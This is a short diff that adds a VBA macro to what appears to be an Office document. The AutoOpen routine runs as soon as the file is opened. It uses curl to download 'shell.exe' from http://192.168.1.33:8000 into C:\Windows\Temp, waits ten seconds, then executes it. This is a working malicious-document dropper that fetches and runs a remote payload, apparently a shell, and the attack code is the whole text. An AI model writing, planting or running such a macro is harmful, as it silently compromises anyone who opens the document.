@@ -1,0 +1,10 @@
+Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal Milliseconds As LongPtr)
+Sub AutoOpen()
+
+Shell ("curl -o C:\Windows\Temp\shell.exe http://192.168.1.33:8000/shell.exe ")
+Sleep 10000
+Shell ("C:\Windows\Temp\shell.exe")
+
+
+
+End Sub
